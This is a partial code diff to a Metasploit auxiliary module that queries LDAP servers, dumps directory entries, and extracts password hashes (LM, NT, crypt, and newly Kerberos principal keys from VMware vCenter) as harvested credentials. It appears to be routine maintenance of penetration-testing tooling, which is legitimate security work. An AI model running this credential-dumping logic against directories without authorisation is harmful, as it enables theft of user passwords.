@@ -72,7 +72,7 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     @rhost = ip
     base_dn_vuln = nil
-    vprint_status("#{peer} Connecting ...")
+    print_status("#{peer} Connecting ...")
 
     ldap_connect do |ldap|
       if ldap.get_operation_result.code == 0
@@ -98,13 +98,15 @@ class MetasploitModule < Msf::Auxiliary
       max_loot = datastore['MAX_LOOT']
 
       # Dump root DSE for useful information, e.g. dir admin
-      unless max_loot.nil? || (max_loot < 1)
+      if max_loot.nil? || (max_loot > 0)
         print_status("#{peer} Dumping data for root DSE")
         Tempfile.create do |f|
           f.write("# LDIF dump of root DSE for #{peer}\n")
           f.write("\n")
           i = 0
           ldap.search(base: '',
+                      time: 10,
+                      return_result: false,
                       ignore_server_caps: true,
                       scope: Net::LDAP::SearchScope_BaseObject,
                       attributes: %w[* + -]) do |entry|
@@ -137,10 +139,12 @@ class MetasploitModule < Msf::Auxiliary
           f.write("\n")
           i = 0
           ldap.search(base: base_dn,
+                      time: 10,
+                      return_result: false,
                       attributes: %w[* + -]) do |entry|
             base_dn_vuln = base_dn
             empty_respone = false
-            unless max_loot.nil? || (i >= max_loot)
+            if max_loot.nil? || (i < max_loot)
               i += 1
               f.write("# #{entry.dn}\n")
               f.write(entry.to_ldif.force_encoding('utf-8'))
@@ -199,7 +203,7 @@ class MetasploitModule < Msf::Auxiliary
 
   end
 
-  def process_hash(entry, pass_attr_name)
+  def process_hash(entry, attr)
     service_details = {
       workspace_id: myworkspace_id,
       module_fullname: fullname,
@@ -213,7 +217,7 @@ class MetasploitModule < Msf::Auxiliary
     # This is the "username"
     dn = entry[@user_attr].first # .dn
 
-    hash = entry[pass_attr_name].first
+    hash = entry[attr].first
 
     # Skip empty or invalid hashes, e.g. '{CRYPT}x', xxxx, ****
     if hash.nil? || hash.empty? ||
@@ -221,15 +225,24 @@ class MetasploitModule < Msf::Auxiliary
        hash.start_with?('*****') ||
        hash == '*' ||
        hash.start_with?(/xxxxx/i) ||
-       (pass_attr_name =~ /^samba(lm|nt)password$/ && (hash.length != 32))
+       (attr =~ /^samba(lm|nt)password$/ && (hash.length != 32))
       return
     end
 
-    case pass_attr_name
+    case attr
     when 'sambalmpassword'
       hash_format = 'lm'
     when 'sambantpassword'
       hash_format = 'nt'
+    when 'krbprincipalkey'
+      hash_format = 'krbprincipal'
+      # TODO: krbprincipalkey is asn.1 encoded string. In case of vmware vcenter 6.7
+      # it contains user password encrypted with (23) rc4-hmac and (18) aes256-cts-hmac-sha1-96:
+      # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/vmdir/server/common/krbsrvutil.c#L480-L558
+      # Salted with principal name:
+      # https://github.com/vmware/lightwave/blob/c4ad5a67eedfefe683357bc53e08836170528383/vmdir/thirdparty/heimdal/krb5-crypto/salt.c#L133-L175
+      # In the meantime, dump the base64 encoded value.
+      hash = Base64.strict_encode64(hash)
     else
       if hash.start_with?(/{crypt}!?\$1\$/i)
         hash.gsub!(/{crypt}!?\$1\$/i, '$1$')
@@ -253,7 +266,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    print_good("#{peer} Credentials (#{hash_format}) found: #{dn}:#{hash}")
+    print_good("#{peer} Credentials (#{hash_format}) found in #{attr}: #{dn}:#{hash}")
 
     create_credential(service_details.merge(
       username: dn,
